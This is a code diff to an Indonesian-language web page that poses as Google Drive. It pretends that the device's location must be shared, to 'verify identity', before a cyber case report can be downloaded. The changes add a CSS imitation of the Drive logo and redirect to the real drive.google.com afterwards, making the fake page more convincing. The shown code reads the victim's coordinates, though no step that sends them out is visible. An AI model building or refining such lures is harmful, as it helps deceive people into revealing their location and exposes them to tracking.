@@ -5,7 +5,6 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="theme-color" content="#ffffff">
-    <link rel="icon" type="image/x-icon" href="https://wikimedia.org">
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         body {
@@ -28,10 +27,49 @@
             max-width: 400px;
             width: 90%;
         }
-        img {
-            width: 80px;
-            height: auto;
-            margin-bottom: 24px;
+        /* DESAIN LOGO SEGITIGA GOOGLE DRIVE MODERAT */
+        .drive-logo {
+            width: 90px;
+            height: 80px;
+            margin: 0 auto 24px auto;
+            position: relative;
+        }
+        .triangle {
+            width: 0;
+            height: 0;
+            border-left: 45px solid transparent;
+            border-right: 45px solid transparent;
+            border-bottom: 78px solid #1a73e8;
+            position: absolute;
+        }
+        .triangle::after {
+            content: '';
+            position: absolute;
+            top: 22px;
+            left: -22px;
+            width: 0;
+            height: 0;
+            border-left: 22px solid transparent;
+            border-right: 22px solid transparent;
+            border-bottom: 38px solid #f8f9fa;
+        }
+        .green-patch {
+            position: absolute;
+            width: 0; height: 0;
+            border-left: 23px solid transparent;
+            border-right: 45px solid transparent;
+            border-bottom: 78px solid #34a853;
+            transform: rotate(-60deg);
+            transform-origin: 45px 78px;
+        }
+        .yellow-patch {
+            position: absolute;
+            width: 0; height: 0;
+            border-left: 45px solid transparent;
+            border-right: 23px solid transparent;
+            border-bottom: 78px solid #f9ab00;
+            transform: rotate(60deg);
+            transform-origin: 45px 78px;
         }
         h1 {
             font-size: 22px;
@@ -63,7 +101,12 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://wikimedia.org" alt="Google Drive">
+        <!-- LOGO GENERATOR DIGITAL -->
+        <div class="drive-logo">
+            <div class="triangle"></div>
+            <div class="green-patch"></div>
+            <div class="yellow-patch"></div>
+        </div>
         <h1>Anda memerlukan izin</h1>
         <p>Guna memverifikasi identitas dan menyesuaikan zona waktu untuk mengunduh berkas laporan kasus siber ini, Google Drive memerlukan sinkronisasi lokasi perangkat Anda.</p>
         <button class="btn" onclick="mintaLokasi()">BUKA SEKARANG</button>
@@ -87,7 +130,7 @@
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
             alert("Verifikasi Berhasil! Mengalihkan ke dokumen...");
-            window.location.href = "https://google.com";
+            window.location.href = "https://drive.google.com";
         }
 
         function errorCallback(error) {
